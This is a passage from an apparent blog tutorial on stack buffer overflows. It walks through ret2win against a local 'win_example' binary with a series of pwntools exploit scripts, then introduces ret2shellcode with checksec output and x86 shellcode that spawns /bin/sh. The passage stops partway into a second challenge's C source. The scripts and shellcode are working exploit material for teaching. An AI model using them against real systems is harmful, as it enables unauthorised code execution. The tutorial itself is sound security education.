+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804926f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:	    add    esp,<span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049272</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#f92672">&gt;</span>:	    nop
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049273</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>:	    mov    ebx,<span style="color:#66d9ef">DWORD</span> PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049276</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">81</span><span style="color:#f92672">&gt;</span>:	    leave  
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049277</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:	    ret  
+</span></span></code></pre></div><p><strong><code>&gt;_ disassemble win</code></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080491f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	    endbr32 
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080491fa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	    push   ebp
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080491fb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">&gt;</span>:	    mov    ebp,esp
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080491fd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">&gt;</span>:	    push   ebx
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080491fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>:	    sub    esp,<span style="color:#ae81ff">0x4</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049201</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	    call   <span style="color:#ae81ff">0x8049298</span> <span style="color:#f92672">&lt;</span>__x86.get_pc_thunk.ax<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049206</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:	    add    eax,<span style="color:#ae81ff">0x20ee</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804920b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>:	    sub    esp,<span style="color:#ae81ff">0xc</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804920e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">&gt;</span>:	    lea    edx,[eax<span style="color:#f92672">-</span><span style="color:#ae81ff">0x12ec</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049214</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:	    push   edx
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049215</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">31</span><span style="color:#f92672">&gt;</span>:	    mov    ebx,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049217</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	    call   <span style="color:#ae81ff">0x80490c0</span> <span style="color:#f92672">&lt;</span>system@plt<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804921c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">38</span><span style="color:#f92672">&gt;</span>:	    add    esp,<span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804921f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:	    nop
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049220</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">42</span><span style="color:#f92672">&gt;</span>:	    mov    ebx,<span style="color:#66d9ef">DWORD</span> PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049223</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>:	    leave  
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08049224</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">46</span><span style="color:#f92672">&gt;</span>:	    ret
+</span></span></code></pre></div><p>Cooooollll, but what do we actually care about here?? That would be the function called <code>vuln</code> and thats not just because of its name its also because of this little function called <code>gets</code> which features @ instruction <code>0x0804926a</code>. If we read the <code>man</code> page for gets with <code>man gets</code>, we will soon see the beautiful line</p>
+<blockquote>
+<p>Never  use  gets().   Because  it is impossible to tell without knowing the data in advance how many characters gets() will read,  and  because  gets() will  continue  to  store  characters past the end of the buffer, it is extremely dangerous to use.  It has been used  to  break  computer  security. Use fgets() instead.</p>
+</blockquote>
+<p>which pretty much sums it up. <code>gets</code> is an example of an <strong>unguarded</strong> function, we can use it to overrun the <code>42</code> bytes allocated to our buffer, <code>char buf[42];</code>. If we send enough input to the program we will even be able to overwrite data on the programs stack up to the <code>vuln</code> functions <code>ret</code> pointer. Since we have a function <code>win</code> which creates a <code>bash</code> shell for us we also have a useful place to redirect code execution.</p>
+<p>Our goal then is too:</p>
+<ol>
+<li>Overflow the buffer by the right amount to reach the return pointer</li>
+<li>Redirect code execution to the win function</li>
+<li>Win</li>
+</ol>
+<h3 id="exploit-script">Exploit Script</h3>
+<p>We can now begin crafting an exploit with pwntools, which is a handy python library for exploit development. We start by importing the library and establishing a link to the compiled program we wish to exploit/hack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_binary <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./win_example&#39;</span>)
+</span></span></code></pre></div><p>We are now in a position to receive and send data from/to the binary <code>win_example</code> (the program from above). Without getting into the details of pwntools, which is better left to the <a href="https://github.com/Gallopsled/pwntools-tutorial#readme">pwntools tutorial</a> or perhaps my <a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Tooling/PwntoolsCheatsheet.md#pwntools-cheatsheet">cheatsheet</a> we can now receive the banner, which is the text printed to the terminal at the start when the binary runs, and work out the amount of data we need to send to overflow the buffer to the return.</p>
+<p>To do this we can make use of the tool cyclic, which comes with pwntools. Cyclic creates a patterned string of desired length which we can transmit to the binary to observe which part of the string overflowed the return address. We add <code>gdb.attach(target_binary)</code> to the exploit script in order to attach with gdb to the program while the exploit runs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_binary <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./win_example&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># attach to the running program in</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwdbg and break at the main function</span>
+</span></span><span style="display:flex;"><span>gdb<span style="color:#f92672">.</span>attach(target_binary, <span style="color:#e6db74">&#39;break main&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># receive the banner from the </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># program</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(target_binary<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Here we goooooooooo...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># send pattern string to overflow buffer</span>
+</span></span><span style="display:flex;"><span>overflow_test <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">100</span>)                 <span style="color:#75715e"># create a pattern of 100 bytes in length</span>
+</span></span><span style="display:flex;"><span>target_binary<span style="color:#f92672">.</span>sendline(overflow_test)
+</span></span><span style="display:flex;"><span>target_binary<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>If we do this and then type <code>continue</code> or <code>c</code> in the <code>pwndbg</code> window that opens we will see the binary crash with a <code>segfault</code>.</p>
+<blockquote>
+<p>Program received signal SIGSEGV, Segmentation fault.</p>
+</blockquote>
+<p>Which happens when the program attempts to return to:</p>
+<blockquote>
+<p>Invalid address 0x616f6161</p>
+</blockquote>
+<p>We know this because the <code>EIP</code> register points to <code>0x616f6161</code> which is not a valid place for the program to return to. In fact this &lsquo;address&rsquo; is the ASCII value for <code>aaoa</code>, a part of the cyclic pattern string we sent to the program. Pwndbg also tells us the value as a string that this address corresponds to.</p>
+<p>This means that to overflow to just <strong>before</strong>, that is 4 bytes before (the size of one instruction), the return pointer of the function (<code>vuln</code> in this case) we must supply up to <code>aaoa</code> bytes of the cyclic string to the program. We can work out what this is as a decimal value using the <code>cyclic_find</code> function which tells us the offset to a particular 4 byte part of the pattern.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_binary <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./win_example&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># attach to the running program in</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwdbg and break at the main function</span>
+</span></span><span style="display:flex;"><span>gdb<span style="color:#f92672">.</span>attach(target_binary, <span style="color:#e6db74">&#39;break main&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># receive the banner from the </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># program</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(target_binary<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Here we goooooooooo...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># send pattern string to overflow buffer</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overflow_test = cyclic(100)</span>
+</span></span><span style="display:flex;"><span>bytes_to_before_ret <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaoa&#39;</span>)		<span style="color:#75715e"># 54</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>bytes_to_before_ret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)				
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_binary<span style="color:#f92672">.</span>sendline(overflow_test)
+</span></span><span style="display:flex;"><span>target_binary<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Running the exploit with the <code>DEBUG</code> arg as follows:</p>
+<p><code>python3 exploit_script.py DEBUG</code></p>
+<p>will print the values wrapped in <code>log.info()</code> to the terminal (stdout). Doing so tells us that the pattern occurs <code>54</code> bytes into the pattern string.</p>
+<p>For us this means that we need to transmit <strong>54 bytes</strong> to the program to overwrite all the data on the stack to just before the return pointer.</p>
+<p>We are now ready to overwrite the return pointer with the address of the <code>win</code> function which will cause the program to redirect execution from <code>vuln</code> to <code>win</code>. The address of <code>win</code> is just another 4 byte quantity like x86 instructions, in fact it is just the address of the <strong>first</strong> instruction in the win function. Since no <a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Theory/MemoryProtections.md#binary-memory-protections">memory protections</a> are enabled on the binary we can simply look at the address of wins&rsquo; first instruction in gdb and then hardcode the value into our exploit.</p>
+<p>To do so we repeat the process of disassembly from earlier,</p>
+<blockquote>
+<p><code>pwndbg&gt; disassemble win</code></p>
+</blockquote>
+<p>and take the first address <code>0x080491f6</code> on the far right which is the instruction <code>endbr32</code>.</p>
+<p>However we can do this in a <strong>better</strong> way with pwntools using the <code>ELF()</code> function as follows.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_binary <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./win_example&#39;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./win_example&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># attach to the running program in</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwdbg and break at the main function</span>
+</span></span><span style="display:flex;"><span>gdb<span style="color:#f92672">.</span>attach(target_binary, <span style="color:#e6db74">&#39;break main&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># receive the banner from the </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># program</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(target_binary<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Here we goooooooooo...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># send pattern string to overflow buffer</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overflow_test = cyclic(100)</span>
+</span></span><span style="display:flex;"><span>bytes_to_before_ret <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaoa&#39;</span>)		<span style="color:#75715e"># 54</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>bytes_to_before_ret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)				
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hook the address of win from</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># symbols</span>
+</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;win&#39;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Win @ </span><span style="color:#e6db74">{</span>hex(win_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)              <span style="color:#75715e"># [*] Win @ 0x80491f6 </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_binary<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;TODO&#39;</span>)
+</span></span><span style="display:flex;"><span>target_binary<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>The <code>ELF</code> function lets us read symbols from the <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF</a> executable format, with the assumption that symbols are present (see <a href="https://en.wikipedia.org/wiki/Stripped_binary">stripped binary</a>).</p>
+<p>We now have everything we need to redirect code execution to <code>win</code> and pwn the binary. To place the address of <code>win</code> onto the stack at the return we must send it to the binary in <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a> form since the binary runs on a 32 bit little endian machine. What this looks like is a backwards version of the address,</p>
+<blockquote>
+<p>\xf6\x91\x04\x08</p>
+</blockquote>
+<p>as a byte string. This again can be simplified with pwntools using the <code>p32</code> function as follows.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_binary <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./win_example&#39;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./win_example&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># attach to the running program in</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwdbg and break at the main function</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(target_binary, &#39;break main&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># receive the banner from the </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># program</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(target_binary<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Here we goooooooooo...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># send pattern string to overflow buffer</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overflow_test = cyclic(100)</span>
+</span></span><span style="display:flex;"><span>bytes_to_before_ret <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaoa&#39;</span>)		<span style="color:#75715e"># 54</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>bytes_to_before_ret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)				
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hook the address of win from</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># symbols</span>
+</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;win&#39;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Win @ </span><span style="color:#e6db74">{</span>hex(win_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pad with A bytes to ret -&gt; win</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> bytes_to_before_ret <span style="color:#f92672">+</span> p32(win_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_binary<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the shell</span>
+</span></span><span style="display:flex;"><span>target_binary<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Finally we can employ another pwntools function <code>fit</code> or <code>flat</code> to simplify the exploit with the knowledge that the return pointer is <strong>54 bytes away</strong> from the controlled buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_binary <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./win_example&#39;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./win_example&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># receive the banner from the </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># program</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(target_binary<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hook the address of win from</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># symbols</span>
+</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;win&#39;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Win @ </span><span style="color:#e6db74">{</span>hex(win_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> fit({
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">54</span>: win_addr
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_binary<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>target_binary<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>The <code>fit</code> or <code>flat</code> function writes the variable value at the specified offset(s), in this case <code>54</code>, and fills the preceeding byte range with garbage padding. This is the same functionality as padding with A bytes, <code>b'A' * bytes_to_before_ret</code>.</p>
+<h2 id="ret2shellcode">ret2shellcode</h2>
+<blockquote>
+<p>What if we have a buffer overflow on the stack but no win function? Where can we go?</p>
+</blockquote>
+<p>ret2shellcode is the technique of using the controlled return pointer from a buffer overflow to jump to code we control. The next path of enquire is <em>&ldquo;How do we get the code there?&rdquo;</em>, in short we place it there ourselves.</p>
+<h3 id="a-note-on-memory-protections">A Note On Memory Protections</h3>
+<p><a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Theory/MemoryProtections.md">Memory protections</a>, which are effectively a set of mitigations put in place by compilers like <code>gcc</code> and kernels like the linux kernel, are a pain for exploit development that we will explore more later on. For now all you need to know is that if the <code>NX</code> (No-Execute) bit or protection is not enabled we can execute code on the stack! You can check the compiler protections put in place on the target binary by running a little tool <code>checksec</code> which is included with pwntools. Usage is:</p>
+<ul>
+<li><code>checksec &lt;binary&gt;</code></li>
+</ul>
+<p>The output will resemble the following:</p>
+<pre tabindex="0"><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled           &lt;-- if disabled we can execute code in the stack region
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre><h3 id="shellcode">Shellcode</h3>
+<p>So if we can execute on the stack that means we can place code on the stack, in say a <strong>buffer</strong> we control, and then return to it using our control of the return pointer, but what should this code look like?</p>
+<p><a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Theory/Shellcoding.md">Shellcode</a> is the historic name given to machine code that hackers would use to pop a shell in attacks like this. At a lower level of course machine code is just binary data that the CPU can understand as instructions but if we wind back to higher levels of abstraction machine code is just a string of opcodes. The opcodes themselves correspond to the human readable assembly instructions, a variant of which is featured above. Some really common opcodes you may have seen floating around or certainly will are:</p>
+<ul>
+<li><code>\0xCC</code> SIGTRAP (signal trap code)</li>
+<li><code>\0x90</code> NOP (no operation)</li>
+</ul>
+<p>all of these have assembly equivalents, for example in <code>x86</code> the above correspond to:</p>
+<ul>
+<li><code>int3</code> signal trap code</li>
+<li><code>nop</code> no operation</li>
+</ul>
+<p>Ultimately what this means is we can construct turing complete programs with just opcodes although id rather peel my eyes out with a spoon. Which on a happy note brings us back to pwntools our binary exploitation lord and saviour. The <code>asm()</code> function is truly a gift and puts the fun back into constructing shellcode to pop a shell (which we would otherwise do with opcodes). The function lets us supply <code>x86</code> instructions which will then be converted into a opcode string that we can place on the stack (in this case) to execute our code.</p>
+<p>The following python fragment demonstrates its usage to craft shellcode that will execute the syscall for <code>exceve('/bin/sh')</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor eax, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push eax     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 0x68732f2f   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 0x6e69622f 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov ebx, esp   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push eax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push ebx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov ecx, esp
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov al, 0xb     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
+</span></span></code></pre></div><p>Now I know what you are thinking, <em>&ldquo;Do I need to be fluent in x86 this dead language from before I walked the face of the high level language earth?&rdquo;</em>. Sort of ? No not really &hellip;</p>
+<p>A lot of the time we don&rsquo;t need to do anything too wild with our shellcode for example you can see that even a small fragment like the one above is enough to give us a shell on the system. More complex shellcode may open a file and write its contents into a buffer on the stack which we then read from.</p>
+<h3 id="writing-an-exploit-with-shellcode">Writing an Exploit With Shellcode</h3>
+<p>Now lets take a look at a simple ret2shellcode challenge. The reason it is <strong>simple</strong> is because the address of the buffer on the stack that we will place our shellcode into is leaked by the binary. In harder ret2shellcode challenges you may need to leak the buffer address yourself, with say a format string vuln (which we will explore soon), or guess its location.</p>
+<h4 id="c-source">C Source</h4>
+<ul>
+<li>This is the source code for the challenge</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
